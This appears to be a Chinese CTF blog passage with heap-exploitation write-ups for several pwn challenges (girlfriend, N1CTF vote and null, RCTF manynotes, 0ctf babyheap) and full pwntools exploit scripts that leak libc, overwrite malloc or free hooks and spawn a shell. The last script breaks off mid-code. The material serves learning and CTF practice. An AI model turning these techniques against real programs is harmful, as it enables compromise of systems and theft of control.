ps：出了girlfriend，还是没有girlfriend（&gt; _&lt;）。。。。 girlfriend:题目：girlfriend 程序分析：emmm，首先看到这道题和平常的套路菜单题不同，五个选项从名字并看不出什么端倪。。。。还是静下心一个一个慢慢分析吧orz。。。。 begin函数:我们可以看到在begin函数中，每次选项之后都会经过一个if语句来判断是否创建线程，创建的线程数所依据的invite_num现在还未知，创建以后，主线程会申请一个0x30的chunk，每个线程中也会创建0x30的chunk，且他们都保存在girlfriend_chat_list中，然后我们发现主线程会sleep一段时间，这个时间似乎可以由我们掌控（猜一下啦），这个时间可以用来让我们选择是将主线程的堆指针放到girfriend_chat_list的最后（设置的足够长，等所有线程malloc完主线程再malloc），还是第一位（设置为0），这一点在之后是很关键的一步。 personal_info函数:当name_status大于0时（在begin里实现这个），将会启用一个格式化字符串漏洞（前提是name可控的话）。 chat函数:让我们在girl_chat_list中选一个chunk然后可以溢出8字节，不过这8字节的位置在chunk的地址的0x30之后。看似似乎并没有什么作用。。。继续看吧 make_appointment函数：在这个函数中，我们可以控制invite_num，也就是线程数，和主线程的sleep的时间，并开启一个begin函数中的if语句中的状态变量。而且还可以输入name，不过。。。不过。只有四个字节orz（%k&amp;p，k&lt;=9），这就很操蛋，因为64位的格式化字符串实际上从6才开始，到9就结束的话可以泄露的范围很小。。。 let_go函数：let_go函数里有两个状态，一个第一次调用时先定一个闹钟，这个闹钟就是每个线程的sleep时间，之后再调用的话就会又有三个分选项（第三个算是隐藏选项，其中有一个off-by-one漏洞，但是其需要通过一个if条件语句才能开启。），其余两个功能就是new与delete的常规操作，不过在new里，我们发现一个不起眼的地方，就是watch movie这里，感觉这里出的莫名其妙。。。干啥用的？？后来发现是一个任意地址溢出漏洞，不过只能加一次，且只能加一。先放这里吧。 这道题信息量比较大，题目先后关联比较紧密，如果没有把程序完全看懂的话很难做出来，甚至连思路都没有。 我们来仔细分析一下： 首先我们可以先调用make_appointment和let_go使name_status变为1，利用格式化字符串泄露信息，但是调试发现只能泄露出程序基址，无法泄露libc。 想利用off-by-one但是if条件过不了，寻找能使if条件中变量值改变的函数，发现在start_routine中，使 (signed int)__readfsdword(0xFFFFFFFC) &gt; 1即可，由题目之前介绍的知识可知，这个位置方法是线程私有变量，所以只要有一个线程实现这个使key等于1就行了，但是调试发现这个位置始终为1，且没有函数能让其变化。。思路陷入死胡同。。。 怎样泄露libc也没有头绪。那个溢出似乎能派上用场，但其只能溢出线程和主线程的topchunk的前八个字节啊。。。 movie的不起眼小功能还不知道怎么用。。。。 这个时候我们就需要上网查阅资料。。。终于想到可以利用arena的复用，申请九个thread，然后最后一个线程和主线程共用一个arena，然后用chat函数溢出最后一个线程，更改主线程chunk中的name指针为puts函数地址，泄露libc！！！！ 然后然后利用watch movie的任意地址加一，使某一个线程的FS：0xFFFFFFC加一变为2，通过start_routine的if检查，使key变为1，开启off-by-one，最后实现overlapping，然后为所欲为，拿到shell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']p = process('./girlfriend')#p = remote('47.92.28.22',30499)P = ELF('./girlfriend')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def make(name): p.recvuntil('&gt;&gt; \n') p.sendline('3') p.recvuntil('invite?\n') p.sendline('9') p.recvuntil('name: ') p.send(name) p.recvuntil('When: ') p.sendline('4.0')def let_go1(): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home?\n') p.sendline('3.0') def let_go2(choice,size,to,content,flag = 0): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline(str(choice)) p.recvuntil('have\n') p.sendline(str(size)) if flag == 0: p.recvuntil('movie: ') p.sendline(str(to)) p.recvuntil('something: ') p.send(content)def delete(index): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline('2') p.recvuntil('byebye:') p.sendline(str(index))def chat(index,size,content): p.recvuntil('&gt;&gt; \n') p.sendline('2') p.recvuntil('girl: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)#----------------------first.leak program base addr---------------make('%9$p')let_go1()p.recvuntil('&gt;&gt; \n')p.sendline('1')base_addr = int(p.recv(14),16)-0x1ea5log.success('base_addr = '+hex(base_addr))#----------------------first success------------------------------#---------------second.overflow and leak libc----------------chat(8,0x30,'\x00'*0x40+p64(base_addr+P.got['puts']))#gdb.attach(p)p.recvuntil('&gt;&gt; \n')p.sendline('1')libcbase = u64(p.recv(6).ljust(8,'\x00'))-libc.sym['puts']log.success('libcbase = '+hex(libcbase))#--------------second success-------------------------------#--------------third.add key-----------------------------#gdb.attach(p,'b *base_addr+0x1813')to = (libcbase-(0x7ffff77f0000-0x7ffff77ef6fc) - (base_addr+0x6760))/4let_go2(1,0x10,to,'\x44'*0x10)sleep(1) #不要忘记!!!!#-------------third success------------------------------let_go2(1,0xf0,0,'\x44'*0xf0,1)let_go2(1,0xf0,0,'\x44'*0xf0,1) #2let_go2(1,0x60,0,'\x44'*0x60,1) #3let_go2(1,0x60,0,'\x44'*0x60,1) #4let_go2(1,0xf0,0,'\x44'*0xf0,1) #5let_go2(1,0xa20,0,'\x44'*0xa20,1) #6p.recvuntil('&gt;&gt; \n')p.sendline('5')p.recvuntil('home\n')p.sendline('3')p.recvuntil('Index: ')p.sendline('4')p.recvuntil('size: ')p.sendline(str(0x60))p.recvuntil('Content: ')payload = '\x44'*0x58+p64(0x1e0)+'\x00'p.send(payload)delete(3)delete(2)delete(5)let_go2(1,0xe0,0,'\x44'*0xe0,1) #7payload = libcbase+(0x7f35b1799b20-0x7f35b13d5000)-0x33let_go2(1,0x20,0,p64(0x71)+p64(payload)+p64(0)*2,1) #8one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]let_go2(1,0x60,0,'\x44'*0x60,1) #9let_go2(1,0x60,0,'\x44'*11+p64(libcbase+one_gadget[2]),1) #10delete(10)p.interactive() 反思与需要注意的细节：在设置主线程和分线程的sleep时间时，我们要一定要注意了，main_thread的sleep时间一定要充足，不要太短，两三秒差不多，不要设0.5秒这种。。因为太短的话不一定能使所有的thread的malloc申请完，不一定能使第九个thread的chunk位于main_thread的chunk上方，也就无法泄露。 线程的sleep时间比main_therad的sleep时间长一秒钟即可，这一秒种是让主线程有充足的时间利用watch movie功能的任意地址加一漏洞使某一个线程的fs:0xffffffc加一，在exp中也最好也等待1秒钟，看到程序输出Now you have a girlfriend再继续往下进行，防止数据错乱。 2018_N1CTF_vote:题目：vote和null 题目分析：由题目放进ida里，观察程序我们可发现这是一个投票的程序，然后在堆里会建一个竞选选手结构体，装有count（所获票数），time（当前时间）和name（我们自己可控），最多可建16个，所以我们可以大致猜到，这题的count和time是用来干扰我们控制伪造chunk的fd和bk指针用的，然后我们若选择投票功能，主线程会创建一个子线程，然后在子线程里会sleep三秒钟，之后会在投票池投最新的竞选选手一票。（这里有个条件竞争的漏洞，或者说需要避免的地方，就是如果先投了一个选手，在三秒内再投了另外一个选手，前一个线程中的指针会被第二个线程篡改，就等于给第二个选手投了两票，我们需要避免这一点），然后在cancel功能里有一个uaf漏洞（保证这个uaf漏洞可以trigger的条件是要避免出现前面所说的条件竞争，且不能给我们要cancel的选手投票。） 利用这个uaf可以直接泄露libcbase，然后我们发现vote功能可以给已经free的chunk投票，且投票不限次数，所以我们想到可以用对已经放入fastbin的chunk进行多次vote来modify其fd指针（常规的fastbin_attack），使其指向我们伪造的一个fastbin_chunk（可以用name来构造）。然后劫持到main_arena-0x33，然后改malloc_hook为one_gadget，后利用malloc_printerr触发，getshell!!!!!! exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *debug=0elf = ELF('./4')if debug: p= process('./4') context.log_level = 'debug' context.terminal = ['terminator','-x','sh','-c'] libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("47.92.28.22",30529) libc = ELF('./libc.so.6')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.send(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) name = '\x44'*0x80add(0x80,name) #0add(0x80,'\x44'*0x80) #1cancel(0)show(0)p.recvuntil('count: ')libcbase = int(p.recvuntil('\n'),10) - (0x7f68b6a05b78-0x7f68b6641000)log.success('libcbase = '+hex(libcbase))add(0x80,'\x44'*0x80) #2add(0x50,'\x44'*0x50) #3name = p64(0) + p64(0x71) + p64(libcbase+0x7f0e8c25eb20-0x7f0e8be9a000-0x33) add(0x50,name+'\n') #4cancel(4)cancel(3)for i in range(0x20): vote(3)sleep(4)'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]add(0x50,'\x44'*0x50)add(0x50,'\x44'*0x50)add(0x50,'\x00'*3+p64(libcbase+one_gadget[2])+'\n')cancel(7)#gdb.attach(p)p.interactive() 2018_N1CTF_null:程序分析与漏洞挖掘：这道题又触及到了我的一块知识盲区，就是threads的malloc_state和heap_info结构体的内容以及他们在内存中的地址，和一个read()函数的溢出漏洞。 程序逻辑很简单，就是输入一段密码然后程序会创建一个线程。 然后在线程中可以进行不限次数和size最大为0x4000的malloc，并在最后一个malloc里可以填充数据，在这里我们仔细观察的话可以发现一个溢出漏洞，第一次不read满的话，第二次还能继续read。 调试发现，线程的chunk会申请在线程的堆块区，然后再这个堆块区的首位先是heap_info结构体（一个堆块区一个，每个堆块区的heap_info结构体之间用链表相连，且他们都保存了malloc_state的地址），然后紧接着是malloc_state结构体（一个线程只有一个），之后会一直往后申请，继续调试发现当我们把当前堆块区填满时，操作系统会在当前堆块区地址之前（和之前那个不相邻）再次分配一块堆块区，且大小为（每一块大小为0x4000000），这时候我们继续申请消耗堆块区空间，当这一块堆空间又被消耗完时，操作系统又会在其后分配一块新的堆空间，我们调试发现第三块的尾部就是初始堆块区的头部。 当继续消耗堆空间使第三块快耗尽时，我们利用溢出进行fastbinattack攻击（因为第一个堆块区的首部是malloc_state结构体），将0x70size的chunk劫持到bss段上（利用stdout流的首字节为0x7f），然后输入’/bin/sh\x00’字符串，并且将函数指针改为system的地址，然后当程序调用函数指针时就会打开shell。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.log_level = 'debug' p = process('./null_')p.recvuntil('password: \n')p.send("i'm ready for challenge\n")for i in range(12): p.recvuntil('Action: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(0x4000)) p.recvuntil('blocks: ') p.sendline('1000') p.recvuntil('(0/1): ') p.sendline('1') p.recvuntil('Input: ') payload = '\x44'*0x4000 p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x4000))p.recvuntil('blocks: ')p.sendline('262')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '\x44'*0x3000p.send(payload)payload = '\x44'*0x1020 + p64(0)*10 + p64(0x60201d)p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x60))p.recvuntil('blocks: ')p.sendline('0')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '/bin/sh\x00' + '\x00'*3 payload+= p64(0x400978) #addr of systempayload+= p64(0)*(0x60/8)p.send(payload)p.interactive() PS：我发现似乎线程与程序交互的数据只能配了context.log_level = ‘debug’，才能看得出来，打开shell以后也必须这样，去掉context.log_level = ‘debug’，程序的交互将不可见。 2019_RCTF_manynotes:题目：manynotes 这道题乍一看，和2018_Nu1CTF_null差不多，漏洞点相同，但是仔细看的话是他的进化版。 首先string ./libc.so.6 | grep GLIBC来判断libc的版本为2.26，存在tcache。 但是因为洞是一样的，所以开始的时候还是以2018Nu1LCTF_null的思路来做，也是比较顺利，到达溢出点后，开始出现错误，溢出了线程的malloc_state后，改写其0x70位置的fastbinY[]为malloc_hook-0x23，然后申请发现会出错。。。调试到_int_malloc之后找出错点，如下： 我们可以看到，malloc_hook-0x23处的地址的确变为了victim，但是在遍历循环时，_int_malloc想对victim的fd指向的chunk干一些事（[rsi+0x10]代表的意义就是victim-&gt;fd-&gt;fd），因为2.26的源码我还没读，所以我不是很知道这是干啥的orz，但是因为fd处的数据是非法的，读他指向的内容肯定会报错。。。所以只能另寻他法。 最简单的一种就是继续往后溢出，改写tcache_bin，然后伪造一个tcache到malloc_hook-8，然后申请对应的size的chunk，之后进行realloc微调即可。 看网上的wp，说利用house of orange也可以。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#coding:utf-8from pwn import *path = './many_notes'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,times,choice,content): p.recvuntil('Choice: ') p.send('0') p.recvuntil('Size: ') p.send(str(size)) p.recvuntil('Padding: ') p.send(str(times)) p.recvuntil('(0/1): ') p.send(str(choice)) if choice == 1: p.recvuntil('Content: ') p.send(content)p.recvuntil('name: \n')name = 'a'*8p.send(name)p.recvuntil('a'*8)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fd4f3024760-0x00007fd4f2c38000)log.success('libcbase = '+hex(libcbase))for i in range(23): new(0x2000-0x10,0x400-1,0,'\x00') new(0x2000-0x10,0x3fd-1,0,'\x00')'''payload = '\x00' + p64(0)*15*2#payload+= p64(libcbase - (0x00007f36d7dcc000-0x00007f36d0000020)) + p64(0)#payload+= p64(0x3fff000) + p64(0x3fff000)payload+= p64(0)*9payload+= p64(libcbase+libc.sym['__malloc_hook']-0x23)#payload+= p64(0)*4#payload+= p64(libcbase+(0x7f6ec00008c0-0x00007f6ec6c85000))new(0x1f00-0x10,0,1,'\x11'*(0x1f00-0x10-1))p.send(payload)gdb.attach(p)one_gadget = [0x4f2c5,0x4f322,0x10a38c]payload = '\x00'*0x13 + p64(libcbase + one_gadget[0])new(0x60,0,0,payload)'''new(0x1f00-0x10,0,1,'\x11'*(0x1f00-0x10-1))payload = '\x00'payload+= p64(0) + p64(0x20e1) p.send(payload)new(0x800+0x7c1-0x10,0,0,'\x00')new(0x800+0x1a0-0x10,0,0,'\x00')new(0x240+0x280,0,0,'\x00')payload = '\x01' + '\x00'*7payload+= p64(0)*7payload+= p64(libcbase+libc.sym['__malloc_hook']-8)payload = payload.ljust(0x240,'\x00')new(0x240,0,1,payload)one_gadget = [0x4f2c5,0x4f322,0x10a38c]payload = p64(libcbase+one_gadget[0]) + p64(libcbase+libc.sym['realloc']+2)new(0x10,0,1,payload)p.recvuntil('Choice: ')p.send('0')p.recvuntil('Size: ')p.send(str(0x20))if attach == 1: gdb.attach(p)p.interactive() 一些关于线程的指令:arenainfo :打印所有线程的arena信息。在pwndbg中可以使用。 info threads:打印当前程序中所有线程 thread id:切换线程，id看info threads中所标的。 参考链接：free_list的简介 pthread_join及linux线程 https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/ 关于TLS]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5种解法解20170ctf_babyheap]]></title>
    <url>%2F2019%2F06%2F11%2F5%E7%A7%8D%E8%A7%A3%E6%B3%95%E8%A7%A320170ctf_babyheap%2F</url>
    <content type="text"><![CDATA[(这其实这是我的网安实践作业。。。后来觉得放上来凑个数吧。。。orz 第一次解：预览题目：可以看到文件为64位，保护全开，给了libc（版本为2.24），标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存chunk指针列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。我们来逐个分析功能： 在allocate()功能中，我们发现申请的chunk的大小可以由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存我们申请到的chunk的大小。此外，我们申请堆块时用的是 calloc() 而不是malloc()这意味着堆块的数据开始时要被初始化为0，这一点需要注意。 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbinattack功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc才能继续往下进行。 我们可以利用程序的print()功能来实现泄露libc地址，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。 控制程序执行流:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 反思，拓展与多解：回过头来看这一题，就是一道中规中矩的堆题，堆的理论知识扎实并且调试能力不错的人解出应该只是时间问题。又因为这道题漏洞太多，题目所做的限制（申请的堆块大小不限制，chunk的所在范围不限制，任意溢出漏洞，有upgrade功能，有输出打印功能等等）也太少，正好借这次作业的机会来复习一下之前学过的一些堆利用的基础姿势。 第二种解_realloc_hook微调栈环境：说是第二种解，其实只是在第一种基础解上略加改动，用了一个小技巧而已，在main_arena上方0x20处是realloc_hook和malloc_hook，我们第一种解法是将malloc_hook直接改为one_gadget，这种解法其实有很大的运气成分，因为one_gadget的成功是需要条件的，需要[rsp+0xxx] == NULL 时才会成功有时候我们不能保证这个条件成立，这时就有一个技巧叫做realloc_hook微调，利用realloc_hook来调整栈环境，因为我们将chunk直接伪造在&amp;main_arena-0x33处，所以我们可以把realloc_hook和malloc_hook全都控制，realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址，所以我们把realloc_hook设为one_gadget的地址，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))allocate(0x60) #0allocate(0x60) #1allocate(0x60) #2allocate(0x60) #3allocate(0x60) #4allocate(0x60) #5 payload='a'*96+p64(0x00)+chr(0xe1)fill(2,len(payload),payload)delete(3)allocate(0x60)#3 p.sendline('4')p.recvuntil('Index:')p.sendline('4')p.recvuntil('Content: \n')libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7f88fe7e9b78- 0x7f88fe425000)log.success('libcbase = '+hex(libcbase)) #gdb.attach(p)sys = libcbase + libc.symbols['system']re_hook = libcbase + libc.symbols['__realloc_hook']mac_hook = libcbase + libc.symbols['__malloc_hook']realloc = libcbase + libc.symbols['__libc_realloc']allocate(0x60)#6 delete(4)payload=p64(mac_hook-0x23)fill(6,len(payload),payload)allocate(0x60)#4allocate(0x60)#7payload='a'*0xb + p64(libcbase+0x4526a) + p64(realloc+8)fill(7,len(payload),payload)allocate(0x60)#gdb.attach(p)p.interactive() 第三种解_将topchunk迁移到free_hook上方：同malloc_hook类似，在调用free函数时会先检验free_hook的值。但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以先通过fastbinattack修改topchunk_addr为&amp;__free_hook-0xb58，之后申请内存至free_hook修改为system地址。fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头(原因看最后一种解法largebinattack。) exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') allocate(0x40) #0 allocate(0x40) #1 allocate(0x40) #2 allocate(0x40) #3 allocate(0x40) #4 allocate(0x40) #5 allocate(0x60) allocate(0x60) delete(6) payload = 'a'*64+p64(0x00)+chr(0xa1) payl = '/bin/sh'+chr(0) fill(0,len(payl),payl) fill(2,len(payload),payload) delete(3) allocate(0x40)#3 p.sendline('4') p.recvuntil('Index:') p.sendline('4') p.recvuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7ff5f5385b78-0x7ff5f4fc1000) free_hook=libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) allocate(0x40) delete(6) payload = p64(libcbase+(0x7f8655ab2b4d-0x7f86556ee000)) fill(4,len(payload),payload) #gdb.attach(p) allocate(0x40) allocate(0x40) #8 payload = 'a'*0x1b+p64(free_hook-0xb58) fill(8,len(payload),payload) #gdb.attach(p) for i in range(0,6): allocate(0x200) system = libcbase + libc.symbols['system'] payload = chr(0)*0xf8+p64(system) fill(14,len(payload),payload) delete(0) break except EOFError: p.close()p.interactive() 第四种解_largebin_attack构造fakechunk：因为申请的chunk大小不受限制，所以largebin_attack当然在我们的考虑范围之内，largebinattack的主要效果为在任意地址写入堆地址，实际运用就是用堆地址的开头0x55/0x56来进行chunk的size的错位构造，所以我们就可以在free_hook的上方写入堆地址，然后利用fakechunk来改写free_hook为system，之后运行system(‘/bin/sh\x00’)获取shell。但是需要注意的是并不是一定能成功，因为当size为0x55(1010101)时被free会报错，而0x56(1010110)却不会,因为第二个bit位为0时会被认为是mmap出来的地址从而free这块地址会报错，而为1时则不会，所以加个循环就OK了。 关于largebin_attack的技术在赛题中出现较少，可参考以下链接学习： veritas师傅的blog ctf-wiki 从2019西湖论剑的一道题来看largebinattack exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')#,env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def new(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def upgrade(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') new(0x90) #0 new(0x90) #1 new(0x90) #2 new(0x90) #3 payload = '\x00'*0x90 + p64(0) + p64(0x141) upgrade(0,len(payload),payload) delete(1) new(0x90) #1 view(2) p.readuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7fcbd010eb78- 0x7fcbcfd4a000 ) free_hook = libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) log.success('free_hook = '+hex(free_hook)) new(0x90) #4 p.sendline('3') p.recvuntil('Index: ') p.sendline(str(3)) delete(2) delete(1) delete(0) new(0x20) #0 new(0x4d0) #1 new(0x20) #2 new(0x4e0) #3 new(0x20) #5 delete(1) new(0x500) #1 payload = '/bin/sh\x00' + p64(0)*3 + p64(0) + p64(0x4e1) + p64(0) + p64(free_hook-0x20+8) + p64(0) + p64(free_hook-0x40+3) upgrade(0,len(payload),payload) delete(3) payload = p64(0)*4 + p64(0) + p64(0x4f1) + p64(0) + p64(free_hook-0x20) upgrade(2,len(payload),payload) new(0x40) #3 system_addr = libcbase + libc.sym['system'] payload = '\x00'*0x10 + p64(system_addr) upgrade(3,len(payload),payload) delete(0) break except EOFError: p.close()#gdb.attach(p)p.interactive() 第五种解_利用IO_str_jump来运行system(‘/bin/sh\x00’)：有任意溢出这种大漏洞存在，所以可以溢出到topchunk的内容，IO_FIFE的利用方法就很容易被想到，因为libc2.24较libc2.23对vtable_ptr做了范围检查，我们不能直接控制他，house of orange技术将不再适用，但当然有新的技术衍生出来，就是利用IO_str_jump。具体原理参考以下链接： 新手向——IO_file全流程浅析 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap',env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping 